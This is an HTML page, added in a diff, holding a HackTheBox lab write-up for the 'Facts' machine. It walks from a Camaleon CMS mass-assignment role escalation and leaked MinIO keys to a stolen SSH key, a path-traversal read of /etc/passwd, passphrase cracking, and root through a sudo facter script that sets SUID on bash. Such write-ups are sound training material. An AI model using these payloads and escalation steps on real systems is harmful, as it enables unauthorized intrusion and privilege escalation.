@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/facts.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Facts - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Facts</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Facts</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">camaleon cms cve-2025-2304</span>
+                    <span class="tag">mass-assignment role escalation</span>
+                    <span class="tag">minio s3 key exposure</span>
+                    <span class="tag">ssh key passphrase crack</span>
+                    <span class="tag">facter sudo lpe</span>
+                </div>
+
+                <img src="../../images/hackthebox/facts/index.png" alt="Facts Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. SSH and an nginx web server on 80, plus an unusual service on 54321 that identifies itself as <strong>MinIO</strong>, an S3-compatible object store.</p>
+
+                <pre><code>[facts] nmap -Pn -sSVC -p- -T5 --min-rate 2000 -oN nmap 10.129.7.46
+Nmap scan report for facts.htb (10.129.7.46)
+Host is up (0.15s latency).
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http    nginx 1.26.3 (Ubuntu)
+|_http-title: facts
+54321/tcp open  unknown
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.0 400 Bad Request
+|     Server: MinIO
+|     X-Amz-Request-Id: 188FE672A53B9910
+|     &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+|     &lt;Error&gt;&lt;Code&gt;InvalidRequest&lt;/Code&gt;...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The site on 80 points at <code>facts.htb</code>, so I added it to <code>/etc/hosts</code>. The app is a Ruby on Rails site running <strong>Camaleon CMS</strong> (it sets a <code>_cms_session</code> cookie). The admin panel lives at <code>/admin</code>.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>Camaleon CMS on this build is vulnerable to <a href="https://www.tenable.com/security/research/tra-2025-09">CVE-2025-2304</a> (Tenable TRA-2025-09), a mass-assignment flaw in the user update flow. The user parameters are bound straight to the model, so appending <code>password[role]=admin</code> to the profile request promotes the account to administrator, no authorization check on the role field.</p>
+
+                <p>After registering a normal account and replaying the update request with that extra parameter, I have a full admin session on the CMS.</p>
+
+                <pre><code>&amp;password[role]=admin</code></pre>
+
+                <p>The same admin access also opens the authenticated media-upload RCE described in the same advisory (a path traversal that drops a Ruby file into <code>config/initializers/</code>); <code>expl.py</code> automates it, uploading <code>command_exec.rb</code> via <code>/admin/media/upload</code> with the <code>folder</code> field set to <code>../../../config/initializers/</code>. That is one way onto the box, but there is a faster route: the admin settings leak credentials to the object store.</p>
+
+                <p>Browsing to <code>/admin/settings/site</code> as admin reveals a set of AWS-style keys, which are really the MinIO access and secret keys for the service on 54321:</p>
+
+                <pre><code>access: AKIA370C10C50E3BA5A6
+secret: 6ggZKT5qaTsjtY7tPYl+T5Wrco/gIExUxpIyFtEM</code></pre>
+
+                <p>Configuring the AWS CLI with those keys and pointing it at the MinIO endpoint lists two buckets:</p>
+
+                <pre><code>[/tmp] aws configure
+AWS Access Key ID [None]: AKIA370C10C50E3BA5A6
+AWS Secret Access Key [None]: 6ggZKT5qaTsjtY7tPYl+T5Wrco/gIExUxpIyFtEM
+Default region name [None]: us-east-1
+
+[/tmp] aws s3api list-buckets --endpoint-url http://facts.htb:54321
+{
+    "Buckets": [
+        { "Name": "internal",    "CreationDate": "2025-09-11T12:06:52.640000+00:00" },
+        { "Name": "randomfacts", "CreationDate": "2025-09-11T12:06:52.603000+00:00" }
+    ],
+    "Owner": { "DisplayName": "minio", "ID": "02d6176db174dc93cb1b899f7c6078f08654445fe8cf1b6ce98d8855f66bdbf4" }
+}</code></pre>
+
+                <p>The <code>internal</code> bucket mirrors a home directory, and it contains an <code>.ssh</code> folder with a private key:</p>
+
+                <pre><code>[facts] aws s3 ls s3://internal --endpoint-url http://facts.htb:54321
+                           PRE .ssh/
+2026-01-08 15:45:13        220 .bash_logout
+2026-01-08 15:45:13       3900 .bashrc
+2026-01-08 15:47:17        807 .profile
+
+[facts] aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
+2026-01-31 16:07:23         82 authorized_keys
+2026-01-31 16:07:23        464 id_ed25519
+
+[facts] aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --endpoint-url http://facts.htb:54321</code></pre>
+
+                <p>To find which account the key belongs to, the admin panel also exposes a private-file download that does not sanitise the path, so it doubles as an arbitrary file read. Pulling <code>/etc/passwd</code> shows the local users:</p>
+
+                <pre><code>GET /admin/media/download_private_file?file=../../../../../../etc/passwd
+
+trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>The downloaded <code>id_ed25519</code> is encrypted with a passphrase. I converted it with <code>ssh2john</code> and cracked it against <code>rockyou.txt</code>:</p>
+
+                <pre><code>[facts] john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
+dragonballz      (id_ed25519)
+1g 0:00:01:07 DONE (2026-01-31 16:49)
+
+[facts] john --show hash.txt
+id_ed25519:dragonballz</code></pre>
+
+                <p>The key logs in as <code>trivia</code> using <code>dragonballz</code> as the passphrase, which lands the user flag:</p>
+
+                <pre><code>[facts] ssh -i id_ed25519 trivia@facts.htb
+Enter passphrase for key 'id_ed25519': dragonballz
+-bash-5.2$ id
+uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
+-bash-5.2$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Checking sudo rights, <code>trivia</code> can run <code>facter</code> as root with no password:</p>
+
+                <pre><code>-bash-5.2$ sudo -l
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter</code></pre>
+
+                <p><code>facter</code> is Puppet's system inventory tool. It supports external facts, which are just executable scripts loaded from a directory, and it runs them as the invoking user. Since we invoke it through sudo, any script we hand it executes as root. I dropped a one-line external fact that sets the SUID bit on <code>bash</code>, pointed <code>facter</code> at it, then dropped into a root shell:</p>
+
+                <pre><code>-bash-5.2$ mkdir -p /tmp/facts
+-bash-5.2$ echo '#!/bin/bash
+chmod +s /bin/bash' > /tmp/facts/root.sh
+-bash-5.2$ chmod +x /tmp/facts/root.sh
+-bash-5.2$ sudo /usr/bin/facter --external-dir /tmp/facts
+-bash-5.2$ /bin/bash -p
+bash-5.2# id
+uid=1000(trivia) gid=1000(trivia) euid=0(root) groups=1000(trivia)
+bash-5.2# cat /root/root.txt</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Facts</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
